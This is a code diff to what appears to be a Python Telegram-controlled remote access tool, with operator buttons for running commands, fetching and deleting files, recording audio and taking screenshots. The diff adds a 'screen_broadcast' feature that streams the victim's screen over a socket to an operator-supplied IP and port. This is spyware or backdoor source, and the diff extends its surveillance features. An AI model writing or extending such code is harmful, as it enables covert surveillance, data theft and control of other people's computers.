@@ -21,21 +21,23 @@ exec_get_file_btn = types.KeyboardButton("get_file")
 exec_cmd_sub_btn = types.KeyboardButton("exec_cmd_sub")
 record_btn = types.KeyboardButton("record")
 screenshot_btn = types.KeyboardButton("screenshot")
+screen_broadcast_btn = types.KeyboardButton("screen_broadcast")
 
 markup = types.ReplyKeyboardMarkup(True, True)
 markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
-            exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn)
+            exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn,
+            screen_broadcast_btn)
 
-def connect_to_server(ms):
+def screen_broadcast(ms):
     if checkID(ms):
         bot.send_message(ADMIN, "Enter...")
         
         @bot.message_handler(content_types=["text"])
-        def connect_to_server_next(ms):
+        def screen_broadcast_next(ms):
             try:
                 list_data = ms.text.split()
-                IP = list_data[0]
-                PORT = list_data[1]
+                PORT = int(list_data[0])
+                IP = list_data[1]
                 
                 import numpy as np
                 import socket
@@ -57,8 +59,7 @@ def connect_to_server(ms):
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
         
-        bot.register_next_step_handler(ms, connect_to_server_next)
-
+        bot.register_next_step_handler(ms, screen_broadcast_next)
 
 def create_markup(markup):
     list_files = os.listdir(os.getcwd())
@@ -296,14 +297,17 @@ def CheckCommand(ms):
         elif ms.text == "get_file":
             exec_get_file(ms)
 
+        elif ms.text == "exec_cmd_sub":
+            exec_cmd_sub(ms)
+
         elif ms.text == "record":
             exec_recording(ms)
 
         elif ms.text == "screenshot":
             exec_screenshot(ms)
 
-        elif ms.text == "exec_cmd_sub":
-            exec_cmd_sub(ms)
+        elif ms.text == "screen_broadcast":
+            screen_broadcast(ms)
 
 
 
